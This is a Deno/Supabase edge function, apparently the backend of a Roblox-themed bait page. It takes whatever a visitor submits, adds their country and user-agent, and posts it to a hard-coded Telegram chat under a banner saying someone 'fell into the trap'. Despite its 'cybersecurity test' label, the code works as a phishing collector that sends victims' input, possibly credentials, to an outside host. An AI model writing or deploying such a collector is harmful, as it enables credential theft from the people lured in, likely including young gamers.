import { corsHeaders } from "https://esm.sh/@supabase/supabase-js@2.95.0/cors";

const GATEWAY_URL = "https://connector-gateway.lovable.dev/telegram";
const CHAT_ID = "7808474075";

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response("ok", { headers: corsHeaders });
  }

  try {
    const LOVABLE_API_KEY = Deno.env.get("LOVABLE_API_KEY");
    const TELEGRAM_API_KEY = Deno.env.get("TELEGRAM_API_KEY");
    if (!LOVABLE_API_KEY) throw new Error("LOVABLE_API_KEY missing");
    if (!TELEGRAM_API_KEY) throw new Error("TELEGRAM_API_KEY missing");

    const body = await req.json().catch(() => ({}));
    const rawInput = typeof body?.input === "string" ? body.input : "";
    const input = rawInput.trim().slice(0, 500);
    if (!input) {
      return new Response(JSON.stringify({ error: "empty input" }), {
        status: 400,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    const userAgent = req.headers.get("user-agent") ?? "unknown";
    const country = req.headers.get("cf-ipcountry") ?? req.headers.get("x-vercel-ip-country") ?? "??";
    const ts = new Date().toISOString();

    // Escape HTML
    const esc = (s: string) =>
      s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");

    const text =
      `🎣 <b>Roblox Hacker — Cybersecurity Test</b>\n\n` +
      `Quelqu'un vient de tomber dans le piège 😅\n\n` +
      `<b>Input:</b> <code>${esc(input)}</code>\n` +
      `<b>Country:</b> ${esc(country)}\n` +
      `<b>User-Agent:</b> <code>${esc(userAgent.slice(0, 200))}</code>\n` +
      `<b>Time:</b> ${ts}`;

    const tgRes = await fetch(`${GATEWAY_URL}/sendMessage`, {
      method: "POST",
      headers: {
        Authorization: `Bearer ${LOVABLE_API_KEY}`,
        "X-Connection-Api-Key": TELEGRAM_API_KEY,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });

    const tgData = await tgRes.json();
    if (!tgRes.ok) {
      console.error("Telegram error", tgRes.status, tgData);
      throw new Error(`Telegram failed [${tgRes.status}]: ${JSON.stringify(tgData)}`);
    }

    return new Response(JSON.stringify({ ok: true }), {
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (e) {
    const msg = e instanceof Error ? e.message : "unknown error";
    console.error("send-hack-attempt error:", msg);
    return new Response(JSON.stringify({ ok: false, error: msg }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
